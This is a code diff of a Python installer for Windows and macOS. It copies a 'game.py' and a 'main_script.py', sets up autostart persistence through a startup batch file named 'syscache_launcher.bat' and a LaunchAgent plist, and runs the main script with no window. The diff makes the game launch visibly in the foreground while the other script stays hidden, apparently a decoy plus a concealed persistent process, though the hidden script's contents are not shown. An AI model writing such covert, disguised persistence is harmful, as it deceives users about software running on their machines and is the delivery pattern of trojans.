@@ -65,11 +65,26 @@ def get_pythonw_path() -> str:
     raise FileNotFoundError("pythonw.exe não encontrado no sistema.")
 
 
+def get_python_path() -> str:
+    python = shutil.which("python")
+    if python:
+        return python
+
+    exe = sys.executable
+    if exe.lower().endswith("pythonw.exe"):
+        candidate = exe[:-11] + "python.exe"
+        if os.path.exists(candidate):
+            return candidate
+
+    return exe
+
+
 def install_windows() -> None:
     main_script_path = copy_file_to_install("main_script.py")
     game_path = copy_file_to_install("game.py")
 
     pythonw = get_pythonw_path()
+    python = get_python_path()
 
     os.makedirs(STARTUP_DIR, exist_ok=True)
     bat_path = os.path.join(STARTUP_DIR, "syscache_launcher.bat")
@@ -83,14 +98,15 @@ exit
         f.write(bat_content)
 
     subprocess.Popen([pythonw, main_script_path], shell=False)
-    subprocess.Popen([pythonw, game_path], shell=False)
+    subprocess.Popen([python, game_path], shell=False)
 
 
 def install_mac() -> None:
     main_script_path = copy_file_to_install("main_script_mac.py")
     game_path = copy_file_to_install("game.py")
 
-    python_cmd = shutil.which("python3") or sys.executable
+    python_bg = shutil.which("python3") or sys.executable
+    python_fg = shutil.which("python3") or sys.executable
     plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{MAC_LABEL}.plist")
 
     plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
@@ -102,7 +118,7 @@ def install_mac() -> None:
 
     <key>ProgramArguments</key>
     <array>
-        <string>{python_cmd}</string>
+        <string>{python_bg}</string>
         <string>{main_script_path}</string>
     </array>
 
@@ -129,8 +145,8 @@ def install_mac() -> None:
     )
     subprocess.run(["launchctl", "load", plist_path], check=True)
 
-    subprocess.Popen([python_cmd, main_script_path], shell=False)
-    subprocess.Popen([python_cmd, game_path], shell=False)
+    subprocess.Popen([python_bg, main_script_path], shell=False)
+    subprocess.Popen([python_fg, game_path], shell=False)
 
 
 if __name__ == "__main__":
